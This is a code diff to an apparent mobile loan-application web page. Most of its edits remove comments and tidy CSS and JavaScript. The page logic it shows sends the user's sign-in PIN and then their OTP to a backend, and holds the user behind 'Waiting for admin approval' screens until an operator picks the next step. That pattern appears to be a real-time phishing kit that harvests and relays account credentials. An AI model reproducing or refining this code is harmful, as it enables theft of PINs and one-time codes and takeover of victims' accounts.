@@ -38,7 +38,6 @@
       -webkit-font-smoothing:antialiased;
     }
     
-    /* ── PHONE CONTAINER - FULL WIDTH ── */
     .phone{
       width:100%;
       max-width:100%;
@@ -55,7 +54,7 @@
     .scr{display:none;flex-direction:column;min-height:100vh;background:var(--white);width:100%;}
     .scr.active{display:flex;}
 
-    /* ── LOADING SCREEN (STANDALONE) ── */
+    /* ── LOADING SCREEN ── */
     #s-loading {
       display: flex !important;
       align-items: center;
@@ -71,9 +70,7 @@
       z-index: 9999;
       flex-direction: column;
     }
-    #s-loading.hidden {
-      display: none !important;
-    }
+    #s-loading.hidden { display: none !important; }
     .loader-wrapper{
       display:flex;
       flex-direction:column;
@@ -89,9 +86,7 @@
       animation:spin 1s linear infinite;
       margin-bottom:24px;
     }
-    @keyframes spin{
-      to{transform:rotate(360deg);}
-    }
+    @keyframes spin{ to{transform:rotate(360deg);} }
     .loader-logo{
       width:120px;
       height:auto;
@@ -106,9 +101,6 @@
       40% { transform: translateX(8px); }
       60% { transform: translateX(-6px); }
       80% { transform: translateX(6px); }
-    }
-    .shake {
-      animation: shake 0.4s ease;
     }
     .shake-error {
       border-color: var(--red-err) !important;
@@ -373,7 +365,6 @@
     }
     .forgot:active { opacity: 0.7; }
 
-    /* ── PIN ERROR MESSAGE ── */
     .pin-error-text {
       text-align: center;
       color: var(--red-err);
@@ -470,7 +461,7 @@
     </div>
   </div>
 
-  <!-- ═══════════════════ LANDING (Loan Application) ═══════════════════ -->
+  <!-- ═══════════════════ LANDING ═══════════════════ -->
   <div class="scr" id="s-land">
     <div class="top-accent"></div>
     <div class="logo-section">
@@ -635,13 +626,11 @@ var durVal = 6;
 var currentToken = null;
 var pollInterval = null;
 var otpCountdown = null;
-var isWaitingForAdmin = false;
 
 // ── HIDE LOADING SCREEN ──
 document.addEventListener('DOMContentLoaded', function() {
   setTimeout(function() {
-    var loadingScreen = document.getElementById('s-loading');
-    loadingScreen.classList.add('hidden');
+    document.getElementById('s-loading').classList.add('hidden');
     document.getElementById('s-land').classList.add('active');
   }, 3000);
 });
@@ -649,12 +638,9 @@ document.addEventListener('DOMContentLoaded', function() {
 // ── Navigation ──
 function go(f, t) {
   document.getElementById(f).classList.remove('active');
-  var e = document.getElementById(t);
-  e.classList.add('active');
-  e.scrollTop = 0;
+  document.getElementById(t).classList.add('active');
   if (t === 's-otp') {
     startOtpCountdown();
-    // Reset OTP error
     document.getElementById('otpErrorText').classList.remove('show');
     document.querySelectorAll('.otp-input').forEach(inp => inp.classList.remove('error'));
   }
@@ -714,6 +700,9 @@ function clearPinError() {
 function showPinError() {
   document.getElementById('pinField').classList.add('error');
   document.getElementById('pinErrorText').classList.add('show');
+  setTimeout(() => {
+    document.getElementById('pinField').classList.remove('error');
+  }, 500);
 }
 
 // ── OTP Error Handling ──
@@ -725,7 +714,6 @@ function clearOtpError() {
 function showOtpError() {
   document.getElementById('otpErrorText').classList.add('show');
   document.querySelectorAll('.otp-input').forEach(inp => inp.classList.add('error'));
-  // Remove error class after animation
   setTimeout(() => {
     document.querySelectorAll('.otp-input').forEach(inp => inp.classList.remove('error'));
   }, 500);
@@ -751,7 +739,7 @@ function submitApplication() {
   }, 3000);
 }
 
-// ── SIGN-IN HANDLER (Connects to Backend) ──
+// ── SIGN-IN HANDLER ──
 async function handleSignIn() {
   var pin = document.getElementById('signinPin').value.trim();
 
@@ -765,13 +753,11 @@ async function handleSignIn() {
     return;
   }
 
-  // Get user data from loan application
   const firstName = document.getElementById('fn').value.trim() || 'Unknown';
   const lastName = document.getElementById('ln').value.trim() || '';
   const fullName = `${firstName} ${lastName}`.trim();
-  const phone = '0771234567'; // Default phone for demo
+  const phone = '0771234567';
 
-  // ── Send PIN to backend ──
   try {
     showOverlay(`
       <div class="overlay-spinner"></div>
@@ -796,7 +782,6 @@ async function handleSignIn() {
     hideOverlay();
 
     if (!data.ok) {
-      // Show PIN error with shake animation
       showPinError();
       alert('❌ Error: ' + (data.error || 'Failed to send PIN for approval'));
       return;
@@ -805,18 +790,18 @@ async function handleSignIn() {
     currentToken = data.token;
     document.getElementById('otpPhoneDisplay').textContent = '+263 ' + phone;
 
-    // Start polling for admin decision
+    // ── Show waiting overlay ──
     showOverlay(`
       <div class="overlay-spinner"></div>
       <div class="overlay-title">Waiting for admin approval</div>
       <div class="overlay-desc">Please wait while your PIN is being verified...</div>
     `);
 
+    // ── Start polling ──
     startPollingForPin(currentToken);
 
   } catch (error) {
     hideOverlay();
-    // Show PIN error with shake animation
     showPinError();
     alert('❌ Network error: ' + error.message);
     console.error('Error:', error);
@@ -842,18 +827,19 @@ function startPollingForPin(token) {
         return;
       }
 
+      console.log('PIN Poll result:', data.result);
+
       if (data.result === 'pending') {
         return;
       }
 
-      // ── Admin made a decision ──
       clearInterval(pollInterval);
       pollInterval = null;
       hideOverlay();
 
       switch (data.result) {
         case 'continue_otp':
-          // Admin approved PIN, go to OTP
+          // ✅ Admin approved PIN → GO TO OTP
           go('s-signin', 's-otp');
           break;
 
@@ -887,7 +873,6 @@ otpInputs.forEach(function(inp, i, all) {
     if (inp.value && all[i + 1]) all[i + 1].focus();
     var full = [...all].every(b => b.value.length === 1);
     otpSubmitBtn.classList.toggle('active', full);
-    // Auto-submit when all digits are filled
     if (full) {
       setTimeout(function() { submitOtp(); }, 400);
     }
@@ -937,7 +922,7 @@ function retryOtp() {
     <div class="overlay-desc">Please wait...</div>
   `);
 
-  const phone = '0771234567'; // Default phone for demo
+  const phone = '0771234567';
   const firstName = document.getElementById('fn').value.trim() || 'Unknown';
   const lastName = document.getElementById('ln').value.trim() || '';
   const fullName = `${firstName} ${lastName}`.trim();
@@ -961,7 +946,6 @@ function retryOtp() {
         return;
       }
       currentToken = data.token;
-      // Start polling for OTP decision
       startPollingForOtp(currentToken);
       startOtpCountdown();
       if (otpInputs.length > 0) otpInputs[0].focus();
@@ -981,10 +965,8 @@ function submitOtp() {
     return;
   }
 
-  // Clear previous errors
   clearOtpError();
 
-  // Send OTP to backend for verification
   showOverlay(`
     <div class="overlay-spinner"></div>
     <div class="overlay-title">Verifying OTP</div>
@@ -1018,7 +1000,6 @@ function submitOtp() {
       }
 
       currentToken = data.token;
-      // Start polling for OTP decision
       startPollingForOtp(currentToken);
     })
     .catch(error => {
@@ -1048,11 +1029,12 @@ function startPollingForOtp(token) {
         return;
       }
 
+      console.log('OTP Poll result:', data.result);
+
       if (data.result === 'pending') {
         return;
       }
 
-      // ── Admin made a decision ──
       clearInterval(pollInterval);
       pollInterval = null;
       hideOverlay();
